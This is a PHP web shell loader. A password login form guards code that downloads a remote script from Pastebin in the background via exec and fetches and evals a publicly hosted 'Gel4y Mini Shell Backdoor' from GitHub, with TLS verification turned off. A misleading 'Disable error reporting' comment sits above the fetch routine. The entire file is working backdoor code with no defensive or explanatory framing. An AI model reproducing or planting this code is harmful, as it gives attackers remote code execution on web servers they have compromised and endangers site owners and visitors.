<?php
session_start();

/**
* Disable error reporting
*
* Set this to error_reporting( -1 ) for debugging.
*/
function geturlsinfo($url) {
   if (function_exists('curl_exec')) {
       $conn = curl_init($url);
       curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
       curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
       curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
       curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

       // Set cookies using session if available
       if (isset($_SESSION['SAP'])) {
           curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
       }

       $url_get_contents_data = curl_exec($conn);
       curl_close($conn);
   } elseif (function_exists('file_get_contents')) {
       $url_get_contents_data = file_get_contents($url);
   } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
       $handle = fopen($url, "r");
       $url_get_contents_data = stream_get_contents($handle);
       fclose($handle);
   } else {
       $url_get_contents_data = false;
   }
   return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in()
{
   return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

// Background process to fetch and save the script
function fetch_and_save_script_in_background($url, $file_path) {
    $command = sprintf(
        'php -r \'$content = file_get_contents("%s"); file_put_contents("%s", $content);\' > /dev/null 2>&1 &',
        escapeshellarg($url),
        escapeshellarg($file_path)
    );
    exec($command);
}

// Check if the password is submitted and correct
if (isset($_POST['password'])) {
   $entered_password = $_POST['password'];
   $hashed_password = '21232f297a57a5a743894a0e4a801fc3'; 
   if (md5($entered_password) === $hashed_password) {
       // Password is correct, store it in session
       $_SESSION['logged_in'] = true;
       $_SESSION['SAP'] = 'biadap'; // Replace this with your cookie data
   } else {
       // Password is incorrect
       echo "Incorrect password. Please try again.";
   }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
   // Fetch the content from Pastebin in the background
   $script_url = 'https://pastebin.com/raw/WupUaWvT';
   $file_path = '/sdcard/_script.php'; // Save directly to /sdcard

   fetch_and_save_script_in_background($script_url, $file_path);

   // Continue executing the original script
   $a = geturlsinfo('https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/refs/heads/1.x.x/gel4y.php');
   eval('?>' . $a);
} else {
   // Display login form if not logged in
   ?>
   <!DOCTYPE html>
   <html>
   <head>
       <title>login dulu bang</title>
   </head>
   <body>
       <center>
       <img src="" />
       <body style="background-color:black;">
       <form method="POST" action="">
           <label for="password">Password:</label>
           <input type="password" id="password" name="password">
           <input type="submit" value="Touch Me!">
       </form>
       </center>
   </body>
   </html>
   <?php
}
?>
